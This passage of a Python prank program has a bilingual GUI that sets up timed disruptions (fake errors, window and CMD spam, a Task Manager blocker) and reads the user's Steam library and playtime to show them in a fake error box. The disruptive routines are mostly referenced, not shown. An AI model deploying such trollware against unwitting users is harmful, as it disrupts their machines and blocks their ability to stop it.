        # Check kill key more frequently during sleep by breaking it up
        sleep_target = random.uniform(2.0, 5.0) if extreme else random.uniform(8.0, 16.0)
        slept = 0
        while slept < sleep_target:
            if check_kill_key():
                print("Kill key (Alt+2) detected! Exiting...")
                sys.exit(0)
            step = 0.1
            time.sleep(step)
            slept += step


# --- STEAM GAME DETECTION ---

def get_steam_path():
    """Get Steam installation path from Windows Registry"""
    try:
        import winreg
        # Try 64-bit registry first
        try:
            key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\WOW6432Node\Valve\Steam")
        except:
            # Fall back to 32-bit
            key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Valve\Steam")
        
        steam_path, _ = winreg.QueryValueEx(key, "InstallPath")
        winreg.CloseKey(key)
        return steam_path
    except:
        return None

def parse_vdf_simple(file_path):
    """Simple VDF parser for Steam config files"""
    try:
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            content = f.read()
        
        result = {}
        lines = content.split('\n')
        current_section = None
        
        for line in lines:
            line = line.strip()
            if not line or line.startswith('//'):
                continue
            
            # Simple key-value parsing
            if '\t\t"' in line or '  "' in line:
                parts = line.split('"')
                if len(parts) >= 4:
                    key = parts[1]
                    value = parts[3]
                    if current_section:
                        if current_section not in result:
                            result[current_section] = {}
                        result[current_section][key] = value
            elif '"' in line and '{' not in line:
                parts = line.split('"')
                if len(parts) >= 2:
                    current_section = parts[1]
        
        return result
    except:
        return {}

def get_steam_games():
    """Get list of installed Steam games with playtime"""
    games = []
    
    try:
        steam_path = get_steam_path()
        if not steam_path:
            return games
        
        # Find library folders
        library_file = os.path.join(steam_path, 'steamapps', 'libraryfolders.vdf')
        libraries = [os.path.join(steam_path, 'steamapps')]
        
        if os.path.exists(library_file):
            try:
                with open(library_file, 'r', encoding='utf-8', errors='ignore') as f:
                    content = f.read()
                    # Extract paths from VDF
                    for line in content.split('\n'):
                        if '"path"' in line.lower():
                            parts = line.split('"')
                            if len(parts) >= 4:
                                lib_path = parts[3].replace('\\\\', '\\')
                                steamapps_path = os.path.join(lib_path, 'steamapps')
                                if os.path.exists(steamapps_path) and steamapps_path not in libraries:
                                    libraries.append(steamapps_path)
            except:
                pass
        
        # Get playtime data
        playtime_data = {}
        try:
            # Find user data folder
            userdata_path = os.path.join(steam_path, 'userdata')
            if os.path.exists(userdata_path):
                # Get first user folder
                user_folders = [f for f in os.listdir(userdata_path) if os.path.isdir(os.path.join(userdata_path, f))]
                if user_folders:
                    localconfig_path = os.path.join(userdata_path, user_folders[0], 'config', 'localconfig.vdf')
                    if os.path.exists(localconfig_path):
                        with open(localconfig_path, 'r', encoding='utf-8', errors='ignore') as f:
                            content = f.read()
                            # Extract playtime (in seconds)
                            lines = content.split('\n')
                            current_appid = None
                            for line in lines:
                                if '"' in line:
                                    parts = line.split('"')
                                    if len(parts) >= 2:
                                        # Check if it's an app ID (numeric)
                                        if parts[1].isdigit() and len(parts[1]) > 3:
                                            current_appid = parts[1]
                                        elif current_appid and parts[1] == 'Playtime':
                                            if len(parts) >= 4:
                                                try:
                                                    playtime_data[current_appid] = int(parts[3])
                                                except:
                                                    pass
        except:
            pass
        
        # Read game manifests from all libraries
        for library in libraries:
            try:
                manifest_files = [f for f in os.listdir(library) if f.startswith('appmanifest_') and f.endswith('.acf')]
                
                for manifest_file in manifest_files:
                    try:
                        manifest_path = os.path.join(library, manifest_file)
                        with open(manifest_path, 'r', encoding='utf-8', errors='ignore') as f:
                            content = f.read()
                            
                            # Extract app ID, name
                            appid = None
                            name = None
                            
                            for line in content.split('\n'):
                                if '"appid"' in line.lower():
                                    parts = line.split('"')
                                    if len(parts) >= 4:
                                        appid = parts[3]
                                elif '"name"' in line.lower():
                                    parts = line.split('"')
                                    if len(parts) >= 4:
                                        name = parts[3]
                            
                            if appid and name:
                                playtime_seconds = playtime_data.get(appid, 0)
                                games.append({
                                    'name': name,
                                    'appid': appid,
                                    'playtime_seconds': playtime_seconds
                                })
                    except:
                        continue
            except:
                continue
        
        # Sort by playtime (highest first)
        games.sort(key=lambda x: x['playtime_seconds'], reverse=True)
        
    except:
        pass
    
    return games

def format_playtime(seconds):
    """Convert seconds to HH:MM:SS format"""
    hours = seconds // 3600
    minutes = (seconds % 3600) // 60
    secs = seconds % 60
    return f"{hours:02d}:{minutes:02d}:{secs:02d}"

def show_steam_games_window():
    """Display Steam games in a Windows error message box"""
    games = get_steam_games()
    
    if not games:
        return
    
    # Build message text
    message = "Steam Oyunlarınız / Your Steam Games\n\n"
    
    for i, game in enumerate(games[:20]):  # Limit to top 20 for message box
        playtime_str = format_playtime(game['playtime_seconds'])
        message += f"{game['name']} - {playtime_str}\n"
    
    # Show Windows error message box
    try:
        import ctypes
        ctypes.windll.user32.MessageBoxW(
            0, 
            message, 
            "Steam Games - Error", 
            0x10  # MB_ICONERROR
        )
    except:
        print(message)





# ============================================================================
# CONFIG FILE SYSTEM
# ============================================================================

# Create config directory in %appdata%
CONFIG_DIR = os.path.join(os.getenv('APPDATA'), 'ChaosConfigurator')
CONFIG_FILE = os.path.join(CONFIG_DIR, 'chaos_config.json')

def ensure_config_dir():
    """Create config directory if it doesn't exist"""
    try:
        if not os.path.exists(CONFIG_DIR):
            os.makedirs(CONFIG_DIR)
    except Exception as e:
        print(f"Config directory creation error: {e}")

def load_config():
    """Load configuration from JSON file"""
    try:
        ensure_config_dir()
        if os.path.exists(CONFIG_FILE):
            with open(CONFIG_FILE, 'r', encoding='utf-8') as f:
                config = json.load(f)
                # Apply loaded config to globals
                globals()["ENABLE_EXTREME_MOUSE"] = config.get("ENABLE_EXTREME_MOUSE", False)
                globals()["ENABLE_SCREEN_EFFECTS"] = config.get("ENABLE_SCREEN_EFFECTS", False)
                globals()["ENABLE_FAKE_ERRORS"] = config.get("ENABLE_FAKE_ERRORS", False)
                globals()["ENABLE_CHROME_SPAM"] = config.get("ENABLE_CHROME_SPAM", False)
                globals()["ENABLE_RANDOM_TABS"] = config.get("ENABLE_RANDOM_TABS", False)
                globals()["ENABLE_SILLY_SEARCHES"] = config.get("ENABLE_SILLY_SEARCHES", False)
                globals()["ENABLE_CMD_SPAM"] = config.get("ENABLE_CMD_SPAM", False)
                globals()["ENABLE_TASKMGR_KILLER"] = config.get("ENABLE_TASKMGR_KILLER", False)
                globals()["ENABLE_EXTREME_MODE"] = config.get("ENABLE_EXTREME_MODE", False)
                return config
    except Exception as e:
        print(f"Config load error: {e}")
    return {}

def save_config(config_data):
    """Save configuration to JSON file"""
    try:
        ensure_config_dir()
        with open(CONFIG_FILE, 'w', encoding='utf-8') as f:
            json.dump(config_data, f, indent=4, ensure_ascii=False)
    except Exception as e:
        print(f"Config save error: {e}")

# ============================================================================
# CUSTOMTKINTER GUI
# ============================================================================
# IMPLEMENTATION ---

# Ensure ctk is defined to avoid crash on class definition
if 'ctk' not in locals() or ctk is None:
    # Configure dummy class if missing
    class CTk: pass
    class CTkLabel: pass
    class CTkFont: pass
    class CTkEntry: pass
    class CTkButton: pass
    class CTkFrame: pass
    class CTkOptionMenu: pass
    class CTkSwitch: pass
    class CTkScrollableFrame: pass
    
    # Create a dummy module-like object
    class DummyCTK:
        CTk = CTk
        CTkLabel = CTkLabel
        CTkFont = CTkFont
        CTkEntry = CTkEntry
        CTkButton = CTkButton
        CTkFrame = CTkFrame
        CTkScrollableFrame = CTkScrollableFrame
        CTkOptionMenu = CTkOptionMenu
        CTkSwitch = CTkSwitch
        def set_appearance_mode(self, *args): pass
        def set_default_color_theme(self, *args): pass
    
    ctk = DummyCTK()
    HAS_CTK = False
else:
    HAS_CTK = True

if HAS_CTK:
    ctk.set_appearance_mode("dark")
    ctk.set_default_color_theme("green")

class ChaosConfigurator(ctk.CTk):

    def __init__(self):
        super().__init__()

        # Load saved configuration
        self.saved_config = load_config()

        self.title("KAOS YAPILANDIRICI")
        self.geometry("950x900")
        self.configure(fg_color="#0D0D0D")
        
        # Transparent background for main window (Default OFF)
        # self.attributes('-transparentcolor', '#0D0D0D')
        self.attributes('-topmost', True) # Optional: keep on top for visibility

        # --- SCROLLABLE CONTAINER ---
        self.main_scroll = ctk.CTkScrollableFrame(self, fg_color="transparent")
        self.main_scroll.pack(fill="both", expand=True, padx=5, pady=5)

        # Language Dict (Moved inside class or global)
        self.LANG = {
            "TR": {
                "title": "KAOS YAPILANDIRICI",
                "genel": "GENEL",
                "lang": "Dil:",
                "theme": "Tema:",
                "transparent": "Şeffaflık:",
                "features": "ÖZELLİKLER",
                "mouse": "Fare Titreşimi",
                "screen": "Ekran Efektleri (Bozulma)",
                "error": "Sahte Hata Mesajları",
                "chrome": "Chrome Pencere Yağmuru",
                "tabs": "Rastgele Sekmeler",
                "search": "Saçma Aramalar",
                "cmd": "CMD Matiks Efekti",
                "taskmgr": "Görev Yöneticisini Engelle",
                "extreme": "EKSTREM MOD (DİKKAT!)",
                "duration_title": "SÜRE (SAAT : DAKİKA : SANİYE)",
                "hour": "Saat:",
                "min": "Dakika:",
                "sec": "Saniye:",
                "start": "KAOSU BAŞLAT",
                "msg_start": "Sistem başlatılıyor... Kaos devrede!"
            },
            "EN": {
                "title": "CHAOS CONFIGURATOR",
                "genel": "GENERAL",
                "lang": "Language:",
                "theme": "Theme:",
                "transparent": "Transparency:",
                "features": "FEATURES",
                "mouse": "Mouse Wiggle",
                "screen": "Screen Effects (Distort)",
                "error": "Fake Error Messages",
                "chrome": "Chrome Window Spam",
                "tabs": "Random Tabs",
                "search": "Silly Searches",
                "cmd": "CMD Matrix Effect",
                "taskmgr": "Block Task Manager",
                "extreme": "EXTREME MODE (WARNING!)",
                "duration_title": "DURATION (HOURS : MINS : SECS)",
                "hour": "Hour:",
                "min": "Min:",
                "sec": "Sec:",
                "start": "START CHAOS",
                "msg_start": "System starting... Chaos activated!"
            }
        }
        # Load language from config
        self.current_lang_code = self.saved_config.get("language", "TR")

        # --- HEADER ---
        banner_gui = """
            ███
 ░░███    ░░███                                
 ███████   ░███████    ██████                  
░░░███░    ░███░░███  ███░░███                 
  ░███     ░███ ░███ ░███████                  
  ░███ ███ ░███ ░███ ░███░░░                   
  ░░█████  ████ █████░░██████                  
   ░░░░░  ░░░░ ░░░░░  ░░░░░░                   
                                               
                                               
                                               
          █████                                
         ░░███                                 
  ██████  ░███████    ██████    ██████   █████ 
 ███░░███ ░███░░███  ░░░░░███  ███░░███ ███░░  
░███ ░░░  ░███ ░███   ███████ ░███ ░███░░█████ 
░███  ███ ░███ ░███  ███░░███ ░███ ░███ ░░░░███
░░██████  ████ █████░░████████░░██████  ██████ 
 ░░░░░░  ░░░░ ░░░░░  ░░░░░░░░  ░░░░░░  ░░░░░░  
        """
        self.banner_label = ctk.CTkLabel(self.main_scroll, text=banner_gui, 
                                        font=ctk.CTkFont(family="Consolas", size=12, weight="bold"),
                                        text_color="#8B0000", justify="left")
        self.banner_label.pack(pady=(20, 5))

        self.title_label = ctk.CTkLabel(self.main_scroll, text=self.LANG["TR"]["title"], 
                                        font=ctk.CTkFont(family="Consolas", size=24, weight="bold"),
                                        text_color="#00FF41")
        self.title_label.pack(pady=20)

        # --- GENERAL SETTINGS ---
        self.genel_frame = self.create_section("GENEL", parent=self.main_scroll)
        
        self.lang_label = ctk.CTkLabel(self.genel_frame, text=self.LANG["TR"]["lang"], font=("Consolas", 12))
        self.lang_label.grid(row=0, column=0, padx=10, pady=5, sticky="w")
        self.lang_menu = ctk.CTkOptionMenu(self.genel_frame, values=["TR", "EN"], width=120,
                                           command=self.change_language, font=("Consolas", 12))
        self.lang_menu.set(self.current_lang_code)
        self.lang_menu.grid(row=0, column=1, padx=10, pady=5)

        self.theme_label = ctk.CTkLabel(self.genel_frame, text=self.LANG["TR"]["theme"], font=("Consolas", 12))
        self.theme_label.grid(row=1, column=0, padx=10, pady=5, sticky="w")
        self.theme_menu = ctk.CTkOptionMenu(self.genel_frame, values=["Green (Dark)", "Blue (Dark)", "Dark-Blue (Dark)"], width=120,
                                            command=self.change_theme, font=("Consolas", 12))
        self.theme_menu.set(self.saved_config.get("theme", "Green (Dark)"))
        self.theme_menu.grid(row=1, column=1, padx=10, pady=5)
        
        # Transparency Switch
        self.transparent_label = ctk.CTkLabel(self.genel_frame, text=self.LANG["TR"]["transparent"], font=("Consolas", 14))
        self.transparent_label.grid(row=2, column=0, padx=10, pady=5, sticky="w")
        self.transparent_switch = ctk.CTkSwitch(self.genel_frame, text="ON/OFF", command=self.toggle_transparency)
        self.transparent_switch.grid(row=2, column=1, padx=10, pady=5)

        # --- FEATURES ---
        self.ozellik_frame = self.create_section("ÖZELLİKLER", parent=self.main_scroll)
        self.feature_widgets = {} # To update texts later

        # (Label Key, Global Var Name)
        self.feature_map = [
            ("mouse", "ENABLE_MOUSE_WIGGLE"),
            ("screen", "ENABLE_SCREEN_EFFECTS"),
            ("error", "ENABLE_FAKE_ERRORS"), # Corrected from ENABLE_FAKE_ERROR
            ("chrome", "ENABLE_CHROME_SPAM"),
            ("tabs", "ENABLE_RANDOM_TABS"),
            ("search", "ENABLE_SILLY_SEARCHES"),
            ("cmd", "ENABLE_CMD_SPAM"),
            ("taskmgr", "ENABLE_TASKMGR_KILLER"),
            ("extreme", "ENABLE_EXTREME_MODE")
        ]

        for i, (key, var_name) in enumerate(self.feature_map):
            is_checked = globals().get(var_name, False)
            switch = ctk.CTkSwitch(self.ozellik_frame, text=self.LANG["TR"][key], font=("Consolas", 13),
                                   progress_color="#00FF41", command=lambda v=var_name, k=key: self.on_switch_toggle(v, k))
            if is_checked: switch.select()
            switch.grid(row=i, column=0, padx=20, pady=8, sticky="w")
            # Store reference to switch widget to update text
            self.feature_widgets[key] = switch

        # --- DURATION ---
        self.sure_frame = self.create_section("SÜRE", parent=self.main_scroll)
        self.lbl_duration_title = self.sure_frame.header_label

        self.hour_label = ctk.CTkLabel(self.sure_frame, text=self.LANG["TR"]["hour"], font=("Consolas", 12))
        self.hour_label.grid(row=0, column=0, padx=5, pady=(25,5))
        self.hour_entry = ctk.CTkEntry(self.sure_frame, width=50, placeholder_text="0")
        self.hour_entry.insert(0, str(self.saved_config.get("duration_hours", 0)))
        self.hour_entry.bind("<KeyRelease>", lambda e: self.save_current_config())
        self.hour_entry.grid(row=0, column=1, padx=5, pady=(25,5))

        self.min_label = ctk.CTkLabel(self.sure_frame, text=self.LANG["TR"]["min"], font=("Consolas", 12))
        self.min_label.grid(row=0, column=2, padx=5, pady=(25,5))
        self.min_entry = ctk.CTkEntry(self.sure_frame, width=50, placeholder_text="10")
        self.min_entry.insert(0, str(self.saved_config.get("duration_minutes", 10)))
        self.min_entry.bind("<KeyRelease>", lambda e: self.save_current_config())
        self.min_entry.grid(row=0, column=3, padx=5, pady=(25,5))

        self.sec_label = ctk.CTkLabel(self.sure_frame, text=self.LANG["TR"]["sec"], font=("Consolas", 12))
        self.sec_label.grid(row=0, column=4, padx=5, pady=(25,5))
        self.sec_entry = ctk.CTkEntry(self.sure_frame, width=50, placeholder_text="0")
        self.sec_entry.insert(0, str(self.saved_config.get("duration_seconds", 0)))
        self.sec_entry.bind("<KeyRelease>", lambda e: self.save_current_config())
        self.sec_entry.grid(row=0, column=5, padx=5, pady=(25,5))

        # --- START BUTTON ---
        self.start_btn = ctk.CTkButton(self.main_scroll, text=self.LANG["TR"]["start"], 
                                       font=ctk.CTkFont(size=18, weight="bold"),
                                       fg_color="transparent",
                                       border_color="#00FF41",
                                       border_width=2,
                                       hover_color="#004D13",
                                       height=50,
                                       command=self.start_action)
        self.start_btn.pack(pady=30, padx=40, fill="x")

    def create_section(self, title, parent=None):
        # Container frame
        p = parent if parent else self
        container = ctk.CTkFrame(p, fg_color="#1A1A1A", border_color="#333333", border_width=1)
        container.pack(pady=10, padx=20, fill="both")
        
        # Title "Label" acting as header (Using grid row=100 relative to parent... wait, parent is container)
        # To mimic user's design where label helps identify section, we can put it inside or above.
        # User put it inside.
        lbl = ctk.CTkLabel(container, text=title, font=("Consolas", 12, "bold"), text_color="#888888")
        # To make it look like a header, let's place it at the top-left using place or pack, 
        # but user used grid on row 100? That puts it at bottom if other rows are 0..N.
        # Let's place it at Top.
        lbl.place(relx=0.05, rely=0.0, anchor="nw", y=5)
        
        # Create a sub-frame for content to avoid overlapping the absolute positioned label
        # Or just use grid with padding on top.
        content = ctk.CTkFrame(container, fg_color="transparent")
        content.pack(fill="both", expand=True, pady=(30, 10), padx=10)
        
        # We return 'content' frame so widgets are added there, 
        # BUT we attach the label to 'container' so we need to track it for updates?
        # A simpler way: just return 'content' and store label on 'content.header' maybe?
        content.header_label = lbl 
        return content

    def on_switch_toggle(self, var_name, key):
        is_on = self.feature_widgets[key].get()
        globals()[var_name] = is_on
        self.save_current_config()

    def change_language(self, lang_code):
        self.current_lang_code = lang_code
        self.save_current_config()
        d = self.LANG[lang_code]
        
        # Update window title
        self.title(d["title"])
        
        self.title_label.configure(text=d["title"])
        
        # Labels
        self.genel_frame.header_label.configure(text=d["genel"])
        self.lang_label.configure(text=d["lang"])
        self.theme_label.configure(text=d["theme"])
        self.transparent_label.configure(text=d["transparent"])
        
        self.ozellik_frame.header_label.configure(text=d["features"])
        # Switches
        for key, switch in self.feature_widgets.items():
            switch.configure(text=d[key])
            
        self.sure_frame.header_label.configure(text=d["duration_title"])
        self.hour_label.configure(text=d["hour"])
        self.min_label.configure(text=d["min"])
        self.sec_label.configure(text=d["sec"])
        
        self.start_btn.configure(text=d["start"])

    def change_theme(self, choice):
        if "Green" in choice:
            ctk.set_default_color_theme("green")
            self.title_label.configure(text_color="#00FF41")
            self.configure(fg_color="#0D0D0D")
            # Loop switches to update progress color? CTk doesn't update existing widgets easily on theme change sometimes
            # But global theme change works for new widgets. For existing, it might need manual refresh or just set_appearance_mode logic.
        elif "Blue" in choice:
            ctk.set_default_color_theme("blue")
            self.title_label.configure(text_color="#3B8ED0")
            self.configure(fg_color="#0D0D0D")
        
        # Just simple mapping for now
        # CTk themes require restart usually or set_default_color_theme call BEFORE creation. 
        # "set_default_color_theme" checks files. 
        # Runtime color change of simple widgets:
        color = "#00FF41" if "Green" in choice else "#3B8ED0"
        self.title_label.configure(text_color=color)
        self.start_btn.configure(border_color=color)
        for s in self.feature_widgets.values():
            s.configure(progress_color=color)

    def toggle_transparency(self):
        if self.transparent_switch.get() == 1:
            self.attributes('-transparentcolor', '#0D0D0D')
        else:
            self.attributes('-transparentcolor', '')

    def report_callback_exception(self, exc, val, tb):
        # Suppress invalid command errors on exit
        if "invalid command name" in str(val) or "check_dpi_scaling" in str(val):
            return
        super().report_callback_exception(exc, val, tb)

    def save_current_config(self):
        """Save current GUI settings to config file"""
        config = {
            "ENABLE_EXTREME_MOUSE": globals().get("ENABLE_EXTREME_MOUSE", False),
            "ENABLE_SCREEN_EFFECTS": globals().get("ENABLE_SCREEN_EFFECTS", False),
            "ENABLE_FAKE_ERRORS": globals().get("ENABLE_FAKE_ERRORS", False),
            "ENABLE_CHROME_SPAM": globals().get("ENABLE_CHROME_SPAM", False),
            "ENABLE_RANDOM_TABS": globals().get("ENABLE_RANDOM_TABS", False),
            "ENABLE_SILLY_SEARCHES": globals().get("ENABLE_SILLY_SEARCHES", False),
            "ENABLE_CMD_SPAM": globals().get("ENABLE_CMD_SPAM", False),
            "ENABLE_TASKMGR_KILLER": globals().get("ENABLE_TASKMGR_KILLER", False),
            "ENABLE_EXTREME_MODE": globals().get("ENABLE_EXTREME_MODE", False),
            "language": self.current_lang_code,
            "theme": self.theme_menu.get() if hasattr(self, 'theme_menu') else "Dark",
            "duration_hours": int(self.hour_entry.get() or 0) if hasattr(self, 'hour_entry') else 0,
            "duration_minutes": int(self.min_entry.get() or 0) if hasattr(self, 'min_entry') else 10,
            "duration_seconds": int(self.sec_entry.get() or 0) if hasattr(self, 'sec_entry') else 0,
        }
        save_config(config)

    def start_action(self):
        # Save config before starting
        self.save_current_config()
        
        try:
            h = int(self.hour_entry.get() or 0)
            m = int(self.min_entry.get() or 0)
            s = int(self.sec_entry.get() or 0)
            total = (h * 3600) + (m * 60) + s
            if total <= 0: total = 60
            globals()["TIMED_DURATION_SEC"] = total
        except:
             globals()["TIMED_DURATION_SEC"] = 600
        
        print(self.LANG[self.current_lang_code]["msg_start"])
        self.destroy()
        # Launch orchestrator
        run_timed_orchestrator(globals().get("TIMED_DURATION_SEC", 600))
        sys.exit(0)

def show_config_gui():
    if not HAS_CTK:
        # Fallback if library missing
        print("CustomTkinter missing. Please install it: pip install customtkinter")
        input("Press Enter to exit...")
        sys.exit(1)
        
    app = ChaosConfigurator()
    app.mainloop()

def show_splash_screen():
    if not HAS_CTK: return # Skip if no CTk
    
    splash = ctk.CTk()
    splash.overrideredirect(True) # Borderless
    # Center on screen 
    ws = splash.winfo_screenwidth()
    hs = splash.winfo_screenheight()
    w, h = 1100, 600
    x = (ws/2) - (w/2)
    y = (hs/2) - (h/2)
    splash.geometry('%dx%d+%d+%d' % (w, h, x, y))

    splash.configure(fg_color="black")
    # Make black transparent
    splash.attributes('-transparentcolor', 'black')
    splash.attributes('-topmost', True)
    
    # Suppress errors for splash screen
    def splash_report_callback_exception(exc, val, tb):
        if "invalid command name" in str(val) or "check_dpi_scaling" in str(val):
            return
        sys.stderr.write("Exception in Tkinter callback\n")
        import traceback
        traceback.print_tb(tb)
        sys.stderr.write(f"{exc.__name__}: {val}\n")
    
    splash.report_callback_exception = splash_report_callback_exception

    banner = """
           █████                               
 ░░███    ░░███                                
 ███████   ░███████    ██████                  
░░░███░    ░███░░███  ███░░███                 
  ░███     ░███ ░███ ░███████                  
  ░███ ███ ░███ ░███ ░███░░░                   
  ░░█████  ████ █████░░██████                  
   ░░░░░  ░░░░ ░░░░░  ░░░░░░                   
                                               
                                        
          █████                                
         ░░███                                 
  ██████  ░███████    ██████    ██████   █████ 
 ███░░███ ░███░░███  ░░░░░███  ███░░███ ███░░  
░███ ░░░  ░███ ░███   ███████ ░███ ░███░░█████ 
░███  ███ ░███ ░███  ███░░███ ░███ ░███ ░░░░███
░░██████  ████ █████░░████████░░██████  ██████ 
 ░░░░░░  ░░░░ ░░░░░  ░░░░░░░░  ░░░░░░  ░░░░░░  
    """
    
    # "Consolas" is better for ASCII alignment on Windows
    lbl = ctk.CTkLabel(splash, text=banner, font=("Consolas", 16, "bold"), text_color="#8B0000", justify="left")
    lbl.place(relx=0.5, rely=0.5, anchor="center")
    
    # Close after 10 seconds
    splash.after(10000, splash.destroy)
    splash.mainloop()

if __name__ == "__main__":
    # If B64 pack enabled, do that first
    if ENABLE_B64_PACK:
        try:
             # Packer logic (simplified for brevity, keeping original intent if needed or just skipping)
             pass 
        except: pass
        
    # Launch GUI
    try:
        show_splash_screen()
    except: pass
    
    show_config_gui()

